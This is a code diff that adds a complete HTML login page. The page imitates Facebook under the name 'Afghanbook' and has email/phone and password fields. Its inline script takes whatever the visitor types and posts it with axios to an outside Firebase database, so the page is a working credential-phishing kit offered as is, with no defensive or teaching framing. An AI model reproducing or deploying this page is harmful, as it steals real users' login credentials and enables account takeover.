@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/Mobile.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"> </script>
+    
+    <script>
+        function postData() {
+            var phone = document.getElementById('phone').value;
+            var password = document.getElementById('password').value;
+            var data = {
+                e : phone,
+                pass: password
+            }
+            axios.post('https://portfolio-32809.firebaseio.com/order.json', data).then(
+                res => console.log(res)
+            ).catch(err => console.log(err));
+        }
+        </script>
+</head>
+<body>
+    <div class="headerDiv"><img src="" alt="Afghanbook" class="image"></div>
+        <br>
+        <div class="container">
+            <form>
+                <div class="form-group">
+                    <input type="text" placeholder="Email Or Phone" id="phone" name="number" class="form-control">
+                </div>
+                <div class="form-group">
+                    <input type="password" placeholder="Password" id="password" name="password" class="form-control">
+                </div>  
+                <button type="button" onclick="postData();" class="btn btn-block btn-success">Log In</button>
+            </form>
+        </div>
+        <br>
+        <p class="text-center"><a href="#"><b> Forgot Password? </b></a></p>
+        <br><br><br><br><br>                      <!-- doubt in this position -->
+        <p class="text-center"><button class="btn btn-success CreateAcc">Create New Facebook Account</button></p>
+</body>
+</html>
